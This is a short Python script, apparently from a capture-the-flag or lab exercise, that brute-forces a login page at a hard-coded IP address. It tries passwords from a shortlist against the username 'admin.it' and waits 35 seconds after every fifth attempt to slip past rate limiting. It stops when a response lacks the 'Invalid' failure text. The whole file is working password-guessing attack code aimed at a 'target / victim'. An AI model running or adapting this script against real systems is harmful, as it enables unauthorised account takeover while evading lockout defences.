#!/usr/bin/python3
from hashlib import md5
import requests
from sys import exit
import time

# Change the url to your target / victim
url = "http://94.237.63.83:57125/login.php"


fail_text  = "Invalid"
username   = "admin.it"
f = open("passwordShortlist.txt", "r")
count = 1
for x in f:
    passwd = x.split("\n")[0]
    data = {
        "userid": username,
        "passwd": passwd,
        "submit": "submit"
    }

    print("checking {} ".format(str(passwd)))
    if( count % 5 == 0 ):
      time.sleep(35)
    # send the request
    res = requests.post(url, data=data)

    # response text check
    if not fail_text in res.text:
        print(res.text)
        print("[*] Congratulations! raw reply printed before")
        exit()

    count += 1
